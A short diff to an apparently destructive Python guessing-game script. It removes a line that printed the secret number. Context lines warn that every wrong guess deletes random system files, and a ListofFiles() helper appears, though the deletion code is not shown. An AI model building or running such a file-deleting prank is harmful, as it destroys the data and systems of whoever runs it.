@@ -18,7 +18,6 @@ def ListofFiles():
         return None
 
 num = randint(1, 10)
-print(num)
 print("\033[31mREAD CAREFULLY\033[0m")
 print("\033[31mGuess the number from 1 to 10. For every wrong guess, I will delete random system file(s) \n—one more than the last time. 😈😈\033[0m")
 no = 1
